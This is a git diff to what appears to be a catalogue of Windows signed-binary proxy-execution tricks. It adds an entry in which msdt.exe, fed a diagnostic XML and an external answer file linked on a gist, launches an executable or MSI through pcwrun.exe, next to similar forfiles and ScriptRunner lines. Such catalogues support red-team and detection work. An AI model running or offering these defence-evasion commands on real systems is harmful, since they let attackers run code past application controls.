@@ -102,6 +102,12 @@ forfiles.exe /c calc.exe
 ```
 ScriptRunner.exe -appvscript C:\Windows\System32\calc.exe
 ```
+( 10v6 )  msdt.exe Execute EXE-MSI Via Reader XML wtih Launch by Pcwrun.exe
+```
+ msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af C:\PCW8E57.xml /skip TRUE
+ &- link file PCW8E57.xml
+ https://gist.github.com/homjxi0e/3f35212db81b9375b7906031a40c6d87
+```
 
 (Note) Product Via @bohops 
 
